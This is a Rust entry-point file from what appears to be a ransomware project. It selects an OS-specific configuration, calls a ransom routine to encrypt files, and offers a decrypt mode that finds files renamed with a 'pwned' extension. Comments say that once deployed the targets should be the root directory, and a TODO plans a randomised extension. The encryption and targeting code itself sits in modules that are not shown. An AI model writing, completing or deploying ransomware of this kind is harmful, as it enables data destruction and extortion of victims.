mod communication;
mod crypto;
mod utils;
mod post;
mod core;

use clap::Parser;
use local_ip_address::local_ip;
use std::sync::Arc;

use crate::utils::{logger, config::AppConfig};
use crate::core::{targeting, ransom};
use crate::crypto::decryption;


#[derive(Parser)]
struct Cli {
    /// Encrypt or decrypt option
    mode: String
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Cli::parse();

    // Check the OS
    let family = std::env::consts::FAMILY;
    
    let logger = Arc::new(logger::Logger::new());

    if args.mode == "encrypt" {
        logger.log(match family {
            "windows" => "Windows OS detected",
            "unix" => "Unix/Linux OS detected",
            _ => "No specific OS detected, defaulting to Linux",
        });

        let config_file = match family {
            "windows" => "config_windows.toml",
            "unix" => "config_unix.toml",
            _ => "config_unix.toml",
        };

        let config = AppConfig::from_file(config_file)
                                .unwrap_or_else(|e| {
            eprintln!("Failed to load config: {}", e);
            std::process::exit(1);
        });

        if let Err(e) = ransom::ransom(logger.clone(), &config).await {
            eprintln!("Ransom failed: {}", e);
        }

    } else if args.mode == "decrypt" {
        if family == "windows" {
            logger.log("Windows OS detected");
            let _ = decrypt_windows(&logger);
        } else if family == "unix" {
            logger.log("Linux OS detected");
            let _ = decrypt_linux(&logger);
        } else {
            logger.log("No specific OS detected, defaulting to Linux");
            let _ = decrypt_linux(&logger);
        }
    } else {
        eprintln!("Usage: <program> <encrypt|decrypt>");
    }

    
    Ok(())
}


fn decrypt_linux(logger: &logger::Logger) -> Result<(), Box<dyn std::error::Error>>{
    logger.init_file_logging("files/decrypt_log.txt")?; // when deployed, should be a temp file

    let local_ip = local_ip()?;
    logger.log(&format!("Decryption starting on local IP: {}", local_ip));

    // Locate encrypted files
    let extension = "pwned"; // TODO: make this a random string
    let path = "/Users/wolf/dev/ransom_testing"; // when deployed, this should be the root directory
    let decrypt_targets = targeting::discover_files_decrypt(&logger, &path, &extension)?;

    let _ = decryption::decrypt(decrypt_targets, &logger)?;

    Ok(())
}


fn decrypt_windows(logger: &logger::Logger) -> Result<(), Box<dyn std::error::Error>>{
    logger.init_file_logging(".")?; // when deployed, should be a temp file
    let local_ip = local_ip()?;
    logger.log(&format!("Decryption starting on local IP: {}", local_ip));


    // Locate encrypted files and decrypt
    let extension = "pwned"; // TODO: get from config file
    let path = "C:\\Users\\Administrator\\Desktop"; // when deployed, this should be the root directory
    let decrypt_targets = targeting::discover_files_decrypt(&logger, &path, &extension)?;

    let _ = decryption::decrypt(decrypt_targets, &logger)?;

    Ok(())

}
